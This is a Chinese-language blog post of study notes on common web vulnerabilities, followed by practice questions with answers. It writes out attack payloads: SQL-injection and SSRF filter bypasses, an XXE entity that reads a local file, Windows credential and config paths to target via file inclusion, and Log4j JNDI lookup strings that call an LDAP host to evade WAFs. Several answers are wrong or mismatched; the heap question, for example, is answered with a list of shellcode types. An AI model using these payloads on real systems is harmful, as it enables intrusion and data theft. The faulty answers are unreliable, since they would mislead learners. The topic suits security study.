---
title: web漏洞复习
date: 2022-03-10 23:21:37
excerpt: web漏洞复习
categories: 复现
---

# web漏洞复习

### 1.owasp top 10

```
1.SQL注入
2.失效的身份认证和会话管理
3.跨站脚本攻击XSS
4.直接引用不安全的对象
5.安全配置错误
6.敏感信息泄露
7.缺少功能级的访问控制
8.跨站请求伪造CSRF
9.实验含有已知漏洞的组件
10.未验证的重定向和转发
```



### 2.sql注入

**sql注入原理**

> 产生SQL注入漏洞的根本原因在于代码中没有对用户输入项进行验证和处理便直接拼接
>
> 到查询语句中。利用SQL注入漏洞，攻击者可以在应用的查询语句中插入自己的SQL代码并传递
>
> 给后台SQL服务器时加以解析并执行。



**sql注入类型**

按照注入点类型分类可分为

- 数字型注入
- 字符型注入

按照执行效果分类可分为

- 盲注
- 报错注入
- 联合查询
- 堆叠注入
- 宽字节注入
- 二次注入



**sql注入危害**

1. 攻击者未经授权可以访问数据库中的数据，盗取用户的隐私以及个人信息，造成用户的信息泄露。
2. 可以对数据库的数据进行增加或删除操作，例如私自添加或删除管理员账号。
3. 如果网站目录存在写入权限，可以写入网页木马。攻击者进而可以对网页进行篡改，发布一些违法信息等。
4. 经过提权等步骤，服务器最高权限被攻击者获取。攻击者可以远程控制服务器，安装后门，得以修改或控制操作系统。



**报错注入常用函数**

- updatexml()
- extractvalue()
- floor()



**sql注入绕过**

```
绕过空格（注释符/* */，%a0）
括号绕过空格
引号绕过（使用十六进制）
逗号绕过（limit使用from或者offset）（substr使用from for属于逗号）
比较符号（<>）绕过（使用greatest()）
and=&&  or=||
=  用 like 绕过
大小写绕过
双写绕过
特殊编码绕过
```



**sql注入经常出现在什么地方**

- 登录界面
- 删除处
- 搜索框

**Sql server 相关知识**

https://zhuanlan.zhihu.com/p/74546690



### 3.文件上传

**文件上传的危害？**

> 文件上传漏洞危害极大因为可以直接上传恶意代码到服务器上，可能会造成服务器的**网页篡改、网站被挂马、服务器被远程控制、被安装后门等严重的后果**
>
> 



**文件上传怎么防御**

- 客户端检测检测（js检测）
- 服务端检测(MIME检测)
- 服务端检测（扩展名检测）
- 增加白名单

**文件上传怎么绕过(白名单，黑名单，前端等)？**

- .htaccess绕过
- .user.ini绕过
- %00截断绕过



### 3.SSRF漏洞

> 漏洞原理 **SSRF**（Server-Side Request  Forgery，服务器端请求伪造）是一种由攻击者构造请求，由服务器端发起请求的安全漏洞，本质上是属于信息泄露漏洞。  ssrf攻击的目标是从外网无法访问的内部系统（正是因为他是有服务器端发起的，所以他能够请求到与他相连而与外网隔离的内部系统）  很多web应用都提供了从其他的服务器上获取数据的功能（百度识图，给出一串URL就能识别出图片）。  使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等。  这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理，攻击远程和本地的服务器。 一般情况下，  SSRF攻击的目标是外网无法访问的内部系统，黑客可以利用SSRF漏洞获取内部系统的一些信息 。



**ssrf漏洞利用**

- 能扫描内部网络，获取端口，服务信息
- 攻击运行在内网或本地的应用程序。
- 对内网web进行指纹识别
- 对内部主机和端口发送请求包进行攻击
- file协议读取本地文件



**Ssrf漏洞防御**

- 限制请求的端口只能为Web端口，只允许访问HTTP和HTTPS的请求
- 限制不能访问内网的IP，以防止对内网进行攻击
- 屏蔽返回的详细信息



**Ssrf漏洞绕过**

- @符号绕过

  ```
  http://www.xxx.com@www.kxsy.work/
  ```

- IP地址转换

  ```
  例如：120.26.86.156
  二进制 = 1111000000110100101011010011100
  十六进制 = 0x781A569C
  十进制 = 2014992028
  ```

- 转换短网址

  ```
  https://www.985.so/
  例：http://www.kxsy.work/ = http://u6.gg/ks69x
  ```

- 特殊符号替换绕过

  ```
  例：
  http://www.kxsy.work/ = http://www。kxsy。work/
  localhost或者0.0.0.0
  ```

- 302跳转绕过

  ```
  <?php  
  $schema = $_GET['s'];
  $ip     = $_GET['i'];
  $port   = $_GET['p'];
  $query  = $_GET['q'];
  if(empty($port)){  
      header("Location: $schema://$ip/$query"); 
  } else {
      header("Location: $schema://$ip:$port/$query"); 
  }
  ```

- xio.ip绕过，会解析到子域

  ```
  http://10.0.0.1.xip.io = 10.0.0.1
  www.10.0.0.1.xip.io= 10.0.0.1
  http://mysite.10.0.0.1.xip.io = 10.0.0.1
  foo.http://bar.10.0.0.1.xip.io = 10.0.0.1
  10.0.0.1.xip.name resolves to 10.0.0.1
  www.10.0.0.2.xip.name resolves to 10.0.0.2
  foo.10.0.0.3.xip.name resolves to 10.0.0.3
  bar.baz.10.0.0.4.xip.name resolves to 10.0.0.4
  ```

- 用Enclosed alphanumerics绕过

  ```
  利用Enclosed alphanumerics
  ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ >>> http://example.com
  ```

  



### 4.XXE漏洞

**XXE漏洞原理**

> XXE全称为XML External Entity Injection即XMl外部实体注入漏洞

XXE漏洞触发点往往是可以上传xml文件的位置，没有对xml文件进行过滤，导致可加载恶意外部文件和代码，造成任意文件读取，命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害 要了解xxe漏洞，那么一定得先明白基础知识，了解xml文档的基础组成



**XXE漏洞利用**

在php环境下

```
<?php
$xml=simplexml_load_string($_GET['xml']);
print_r($xml);
?>	
```

将以下xml代码进行URL编码，读取文件

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE playwin [
<!ENTITY name SYSTEM "file:///D:/phpStudy/PHPTutorial/WWW/1.txt">
]>
<resume>
<name> &name; </name>
</resume>
```





**Xxe漏洞支持的伪协议**

不同的程序支持协议不同



### 5.文件包含漏洞

**文件包含的函数**

php中有四种

```
require() // 只在执行到此函数时才去包含文件，若包含的文件不存在产生警告，程序继续运行

require_once() // 如果一个文件已经被包含过，则不会在包含它

include() // 程序一运行文件便会包含进来，若包含文件不存在产生致命错误，程序终止运行

include_once() // 如果一个文件已经被包含过，则不会在包含它
```



**文件包含支持的伪协议**

```
php的支持
php://filter
php://input
file://
phar://
zip://
data://
```



**文件包含利用**



包含日志文件getshell

包含敏感文件

```
C:\boot.ini //查看系统版本
C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件
C:\Windows\repair\sam //存储系统初次安装的密码
C:\Program Files\mysql\my.ini //Mysql配置
C:\Program Files\mysql\data\mysql\user.MYD //Mysql root
C:\Windows\php.ini //php配置信息
C:\Windows\my.ini //Mysql配置信息
C:\Windows\win.ini //Windows系统的一个基本系统配置文件
```





### 6.Php命令执行，php代码执行相

**代码执行相关函数**

```
assert()
eval()
call_user_func()
call_user_func_array()
preg_replace()  //7.0版本后已经不存在
array_map()
Usort()
```

**命令执行相关函数**

```
system()
exec()
passthru()
shell_exec()
poopen()
```



### 7.XSS漏洞

**XSS漏洞原理**

> HTML是一种超文本标记语言，通过将一些字符特殊地对待来区别文本和标记，例如，小于符号（<）被看作是HTML标签的开始。当动态页面中插入的内容含有这些特殊字符时，正好你要访问的服务器并没有对用户的输入进行安全方面的验证，用户浏览器会将其误认为是插入了HTML标签，当这些HTML标签引入了一段JavaScript脚本时，这些脚本程序就将会在用户浏览器中执行。所以，当这些特殊字符不能被动态页面检查或检查出现失误时，就将会产生XSS漏洞



**xss漏洞类型**



> 1.反射型
>
> 反射型 XSS 一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。
>
> 对于访问者而言是一次性的，具体表现在我们把我们的恶意脚本通过 URL 的方式传递给了服务器，而服务器则只是不加处理的把脚本“反射”回访问者的浏览器而使访问者的浏览器执行相应的脚本。反射型 XSS 的触发有后端的参与，要避免反射性 XSS，必须需要后端的协调，后端解析前端的数据时首先做相关的字串检测和转义处理。
>
> 此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。
> 2.存储型
>
> 攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。这就意味着只要访问了这个页面的访客，都有可能会执行这段恶意脚本，因此储存型XSS的危害会更大。
>
> 存储型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。
> 3.DOM型
>
> 客户端的脚本程序可以动态地检查和修改页面内容，而不依赖于服务器端的数据。基于DOM的XSS，也就是web server不参与，仅仅涉及到浏览器的XSS。比如根据用户的例如客户端如从 URL 中提取数据并在本地执行，如果用户在客户端输入的数据包含了恶意的 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到 DOM-based XSS 攻击。需要特别注意以下的用户输入源 document.URL、 location.hash、 location.search、 document.referrer 等。



**Dom型xss和反射型xss的区别**

DOM型xss和别的xss最大的区别就是它不经过服务器，仅仅是通过网页本身的JavaScript进行渲染触发的



**Xss漏洞的危害**

```
1.窃取用户Cookie
2.后台增删改文章
3.XSS钓鱼攻击
4.利用XSS漏洞进行传播和修改网页代码
5.XSS蠕虫攻击
6.网站重定向
7.获取键盘记录
8.获取用户信息等
```



**XSS漏洞防御**

> 1、对输入和URL参数进行过滤(白名单和黑名单)
>
> 检查用户输入的数据中是否包含一些特殊字符，如<、>、’、“等，发现存在特殊字符，将这些特殊字符过滤或者编码。
> 2、HTML实体编码
>
> 字符串js编码转换成实体html编码的方法（防范XSS攻击）
> https://www.cnblogs.com/dearxinli/p/5466286.html
> 3、对输出内容进行编码
>
> 在变量输出到HTML页面时，可以使用编码或转义的方式来防御XSS攻击。



### 8.常见的解析漏洞

**Nginx**

> https://blog.csdn.net/Spontaneous_0/article/details/129106641

**Apache**

> https://blog.csdn.net/weixin_44174581/article/details/119387616

**lls**

> https://blog.csdn.net/weixin_43625577/article/details/91971796



### 9.常见的漏扫工具支持扫描的漏洞类型

 **Xray**

```
XSS漏洞检测 (key: xss)
SQL 注入检测 (key: sqldet)
命令/代码注入检测 (key: cmd-injection)
目录枚举 (key: dirscan)
路径穿越检测 (key: path-traversal)
XML 实体注入检测 (key: xxe)
文件上传检测 (key: upload)
弱口令检测 (key: brute-force)
jsonp 检测 (key: jsonp)
ssrf 检测 (key: ssrf)
基线检查 (key: baseline)
任意跳转检测 (key: redirect)
CRLF 注入 (key: crlf-injection)
Struts2 系列漏洞检测 (高级版，key: struts)
Thinkphp系列漏洞检测 (高级版，key: thinkphp)
POC 框架 (key: phantasm)
```

Avws

```
1.WebScanner：全站扫描，Web安全漏洞扫描
2.Site Crawler：爬虫功能，遍历站点目录结构
3.Target Finder：端口扫描，找出web服务器
4.Subdomain Scanner：子域名扫描器，利用DNS查询
5.Blind SQL Injector：盲注工具
6.HTTP Editor：http协议数据包编辑器
7.HTTP Sniffer：HTTP协议嗅探器
8.HTTP Fuzzer：模糊测试工具
9.Authentication Tester：Web认证破解工具
10.Web Srevice Scanner：Web服务扫描器
11.Web Srevice Editor：Web服务编辑器
```



### 10.sqlmap工具参数的使用和含义

- `-v` 显示信息的级别，一共有六级：0：只显示python 错误和一些严重信息；1：显示基本信息（默认）；2：显示debug信息；3：显示注入过程的payload；4：显示http请求包；5：显示http响应头；7：显示http相应页面
- `-u`指定一个url连接，url中必须要有 `?xx=xxx` 才行
- `-r`可以呀将一个post请求方式的数据保存在一个txt中msqlmap会通过post方式检验目标
- `--data=Data`指明参数是哪些。例：`-u "www.abc.com/index.php?id=1" --data="name=1&pass=2"`
- `--random-agent`使用随机user-agent进行测试。sqlmap有一个文件中储存了各种各样的user-agent，文件在`sqlmap/txt/user-agent.txt` **在level>=3时会检测user-agent注入。**
- `--os-shell`创建一个对方操作系统的shell，metepreter或VNC
- `--cookie`指定测试时使用的cookie，通常在一些需要登录的站点会使用。例： `-u "www.abc.com/index.php?id=1"`



### 11.一些常见漏洞



##### **Tomcat**

任意命令执行

https://zhuanlan.zhihu.com/p/137686820



##### iis

目录解析漏洞

文件名解析漏洞

畸形解析漏洞

iis短文件漏洞

PUT任意文件写入

https://blog.csdn.net/weixin_42918771/article/details/105178309



##### apache

换行解析漏洞，多后缀解析漏洞，http路径穿越漏洞

，路径穿越漏洞

https://blog.csdn.net/weixin_44268918/article/details/129129214



**Fastbin**

跟pwn有关，暂时没弄懂

https://www.freebuf.com/articles/web/263598.html





### 12.Cobalt strike,mimikatz工具的一些基础知识



太多了，附上一个链接

https://www.freebuf.com/articles/network/290134.html



### 13.常见框架漏洞



##### Jboss

- **访问控制不严导致的漏洞**
- **反序列化导致的漏洞**



https://blog.csdn.net/m0_58434634/article/details/117434173



##### weblogic

- 弱口令漏洞
- 任意文件上传漏洞
- XML Decoder反序列化漏洞
- webligic-SSRF漏洞
- java反序列化漏洞

https://www.cnblogs.com/-mo-/p/11503707.html



##### thinkphp

- 远程代码执行漏洞

https://www.cnblogs.com/lingzhisec/p/15728886.html



##### Struts2

https://blog.csdn.net/HBohan/article/details/122667891



##### Shiro

- 反序列化漏洞

https://www.freebuf.com/vuls/283810.html



### 14.常见端口对应的漏洞

```
20：FTP服务的数据传输端口
21：FTP服务的连接端口，可能存在  弱口令暴力破解
22：SSH服务端口，可能存在 弱口令暴力破解
23：Telnet端口，可能存在 弱口令暴力破解
25：SMTP简单邮件传输协议端口，和 POP3 的110端口对应
43：whois服务端口
53：DNS服务端口(TCP/UDP 53)
67/68：DHCP服务端口
69：TFTP端口，可能存在弱口令
80：HTTP端口，常见web漏洞
88：Kerberos协议端口
110：POP3邮件服务端口，和SMTP的25端口对应
135：RPC服务
137/138： NMB服务
139：SMB/CIFS服务
143：IMAP协议端口
161/162: Snmp服务，public弱口令
389：LDAP目录访问协议，有可能存在注入、弱口令，域控才会开放此端口
443：HTTPS端口，心脏滴血等与SSL有关的漏洞
445：SMB服务端口，可能存在永恒之蓝漏洞MS17-010
512/513/514：Linux Rexec服务端口，可能存在爆破
636：LDAPS目录访问协议，域控才会开放此端口
873：Rsync ，可能存在Rsync未授权访问漏洞，传送门：rsync 未授权访问漏洞
1080：socket端口，可能存在爆破
1099：RMI，可能存在 RMI反序列化漏洞
1352：Lotus domino邮件服务端口，可能存在弱口令、信息泄露
1414：IBM WebSphere MQ服务端口
1433：SQL Server对外提供服务端口
1434：用于向请求者返回SQL Server使用了哪个TCP/IP端口
1521：oracle数据库端口
2049：NFS服务端口，可能存在NFS配置不当
2181：ZooKeeper监听端口，可能存在 ZooKeeper未授权访问漏洞
2375：Docker端口，可能存在 Docker未授权访问漏洞
2601:   Zebra ，默认密码zebr
3128:   squid ，匿名访问（可能内网漫游)
3268：LDAP目录访问协议，有可能存在注入、弱口令
3306：MySQL数据库端口，可能存在 弱口令暴力破解
3389：Windows远程桌面服务，可能存在 弱口令漏洞 或者 CVE-2019-0708 远程桌面漏洞复现
3690：SVN服务，可能存在SVN泄漏，未授权访问漏洞
4440：Rundeck，弱口令admin
4560：log4j SocketServer监听的端口，可能存在 log4j<=1.2.17反序列化漏洞（CVE-2019-17571）
4750：BMC，可能存在 BMC服务器自动化RSCD代理远程代码执行(CVE-2016-1542)
4848：GlassFish控制台端口，可能存在弱口令admin/adminadmin
5000：SysBase/DB2数据库端口，可能存在爆破、注入漏洞
5432：PostGreSQL数据库的端口
5632：PyAnywhere服务端口，可能存在代码执行漏洞
5900/5901：VNC监听端口，可能存在 VNC未授权访问漏洞
5984：CouchDB端口，可能存在 CouchDB未授权访问漏洞
6379：Redis数据库端口，可能存在Redis未授权访问漏洞，传送门：Redis未授权访问漏洞
7001/7002：Weblogic，可能存在Weblogic反序列化漏洞，传送门：Weblogic反序列化漏洞
7180：Cloudera manager端口
8000：JDWP，可能存在JDWP远程代码执行漏洞。
8069：Zabbix服务端口，可能存在Zabbix弱口令导致的Getshell漏洞
8080：Tomcat、JBoss，可能存在Tomcat管理页面弱口令Getshell，JBoss未授权访问漏洞，传送门：Tomcat管理弱口令页面Getshell
8080-8090：可能存在web服务
8089：Jetty、Jenkins服务端口，可能存在反序列化，控制台弱口令等漏洞
8161：Apache ActiveMQ后台管理系统端口，默认口令密码为：admin:admin ，可能存在CVE-2016-3088漏洞，传送门：Apache ActiveMQ任意文件写入漏洞（CVE-2016-3088）
9000：fastcgi端口，可能存在远程命令执行漏洞
9001：Supervisord，可能存在Supervisord远程命令执行漏洞(CVE-2017-11610)，传送门：Supervisord远程命令执行漏洞(CVE-2017-11610)
9043/9090：WebSphere，可能存在WebSphere反序列化漏洞
9200/9300：Elasticsearch监听端口，可能存在 Elasticsearch未授权访问漏洞
10000：Webmin-Web控制面板，可能存在弱口令
10001/10002：JmxRemoteLifecycleListener监听的，可能存在Tomcat反序列化漏洞，传送门：Tomcat反序列化漏洞(CVE-2016-8735)
11211：Memcached监听端口，可能存在 Memcached未授权访问漏洞
27017/27018：MongoDB数据库端口，可能存在 MongoDB未授权访问漏洞
50000：SAP Management Console服务端口，可能存在 运程命令执行漏洞。
50070：Hadoop服务端口，可能存在 Hadoop未授权访问漏洞
61616：Apache ActiveMQ服务端口，可能存在 Apache ActiveMQ任意文件写入漏洞（CVE-2016-3088）复现
60020：hbase.regionserver.port，HRegionServer的RPC端口
60030：hbase.regionserver.info.port，HRegionServer的http端口

```





### 15.一些最新的漏洞

##### Log4j2

https://juejin.cn/post/7202514143341002789



##### spring-core-rce-2022-03-29

https://blog.csdn.net/weixin_45632448/article/details/124190382





### 16.常见的web漏洞

- 任意文件上传
- 任意文件下载
- 逻辑漏洞
- 反序列化漏洞





### 

## 



-------------------------------------------------------------------------------------------------------------------------------



# 练习思考题



### 1.堆溢出覆盖top chunk的大小(house of force)的说法有哪些？

1. Windows Meterpreter Reverse TCP shellcode：这种 shellcode 可以与 Metasploit 的 Meterpreter 模块配合使用，实现远程代码执行、获取系统信息等功能。
2. Windows Reverse TCP shellcode：这种 shellcode 可以在 Windows 系统上运行，将一个远程 shell 连接回攻击者的主机。
3. Windows Reverse HTTP shellcode：这种 shellcode 可以在 Windows 系统上运行，将一个 HTTP 连接回攻击者的主机。
4. Beacon Payload shellcode：这种 shellcode 可以使用 Cobalt Strike 的 Beacon 功能，实现命令执行、文件传输等功能。
5. Linux Reverse TCP shellcode：这种 shellcode 可以在 Linux 系统上运行，将一个远程 shell 连接回攻击者的主机。
6. Mac Reverse TCP shellcode：这种 shellcode 可以在 Mac 系统上运行，将一个远程 shell 连接回攻击者的主机。



### 2.6379,8009端口对应的漏洞是

- 6379是redis未授权访问漏洞
- 8009是`Apache-Tomcat-Ajp漏洞`，tomcat默认开启ajp服务（8009端口）



### 3.Cobalt strike 可以生成哪些类型的shellcode?

搜不到。。。



### 4.Apache 文件解析漏洞的原理？

> apache的解析漏洞依赖于一个特性：apache默认一个文件可以有多个以点分割的后缀，比如test.php.abc，当最右边的后缀无法识别（不在mime.types文件内），则继续向左识别，知道识别到合法后缀才能进行解析，与windows不同，apache对文件的名解析不是仅仅认识最后一个后缀名，而是从右向左，依此识别，直到遇到自己可以解析的文件为止。

当phpinfo.php被禁止时，phpinfo.php.abc可执行



### 5. 什么中间件存在短文件名漏洞？



**iis**



### 6.xxe漏洞各个语言支持的伪协议有哪些

可利用php://filter伪协议



### 7.S2_052漏洞是由于什么造成的？

此漏洞主要是由于**JBoss中 /jmx-console/HtmlAdaptor 路径对外开放**，并且没有任何身份验证机制，导致攻击者可以进入到JMX控制台，并在其中执行任何功能。



### 8.Weblogic 常见的漏洞有哪些？

- **XMLDecoder反序列化漏洞**
- **T3协议反序列化漏洞**
- **未授权访问漏洞**
- **命令执行漏洞**
- **IIOP协议反序列化漏洞**
- **SSRF漏洞**



### 9.Jboss 常见的漏洞有哪些？

- **访问控制不严导致的漏洞**
- **反序列化导致的漏洞**



### 10.Struts2 常见的漏洞有哪些？

- 反序列化漏洞



### 11.Fastbin 怎么利用？

使用流程如下：

1. 申请同样大小的两个内存块，并将它们都释放，这样这两个内存块就会被放入 Fastbin 链表中。
2. 重新申请同样大小的内存块，此时 glibc 会从 Fastbin 链表中返回其中一个内存块的地址，作为本次申请的内存块。
3. 利用本次申请返回的内存块地址，修改其中保存的值为 Fastbin 链表中未释放的内存块的地址。
4. 再次申请同样大小的内存块，此时 glibc 会从 Fastbin 链表中返回之前修改过的内存块地址，作为本次申请的内存块。



### 12.Ssrf 攻击的目标为？

**<u>外网无法访问的内部系统</u>**



### 13.ssrf 是否可以通过过滤get或post参数进行防御？

不行



### 14.Log4j 怎么绕过？

- **不出现port，避免被waf匹配ip:port**

  ```
  ${jndi:ldap:192.168.1.1/a}
   ${jndi:ldap:192.168.1.1:/a} 
  注意此时需要ldap服务端口为389
  
  ```

  

- **对IP添加包裹**

  ```
  ${jndi:ldap://[192.168.34.96]/a} 
  ${jndi:ldap://[192.168.34.96]]/a} 
   LdapURL取出"[ip]"，LdapCtx去除[]获得ip，两种情况下端口都是389
  
  ```



### 15.ogg是否是php的伪协议？

不是。OGG是一种开放格式的媒体容器，通常用于存储音频和视频文件。它不是PHP的伪协议，PHP的伪协议是一种特殊的协议，用于在PHP中访问各种资源，如文件、网络资源等。PHP的伪协议以特殊的前缀开头，例如file://表示文件协议，http://表示HTTP协议等。



### 16. Zip://伪协议利用对应的php版本号为？

`zip://` 伪协议是在 PHP 5.2.0 版本中引入的，因此在该版本及更高版本的 PHP 中都可以使用。该伪协议允许 PHP 脚本以与本地文件系统相同的方式访问 ZIP 存档文件中的文件。



### 17.文件上传怎么绕过黑名单.asp后缀的过滤？





### 18.Nginx,apache是否存在弱口令？

均存在



### 19.Dom xss和反射型xss的区别是什么？

> DOM 型 XSS 漏洞和反射型 XSS 漏洞的区别在于攻击者注入恶意脚本的位置不同。反射型 XSS 漏洞将恶意脚本注入到响应页面中，而 DOM 型 XSS 漏洞将恶意脚本注入到浏览器的 DOM 中。



### 20.Ms17_010漏洞是那个端口造成的？

445端口



### 21.Sqlmap 中要使用随机user-agent应该使用什么参数？

```
--random-agent
```



### 22.Xp_cmdshell 是那个数据库中含有的？

` Microsoft SQL Server 数据库`



### 23.Symlink函数是否可以执行系统命令？

不可以



### 24.Samba wannacry溢出漏洞怎么修复？

- 升级 Samba：升级到最新版本的 Samba，这将修复许多与安全有关的漏洞，包括 EternalBlue 漏洞。
- 禁用 SMBv1：在 Samba 服务器上禁用 SMBv1 协议。这是因为 WannaCry 利用的是 SMBv1 协议的漏洞。在 Windows 系统上禁用 SMBv1 协议同样可以减少系统受到攻击的风险。
- 更新操作系统：更新 Windows 操作系统以修补 SMBv1 漏洞。
- 加强安全设置：加强 Samba 服务器的安全设置，包括访问控制、身份验证和日志记录等。例如，可以配置防火墙规则以限制对 Samba 服务器的访问，并配置强密码策略以增强身份验证的安全性。
- 实施安全性检查：定期对 Samba 服务器进行安全性检查，以确保其处于最新的安全状态，并及时修复发现的漏洞。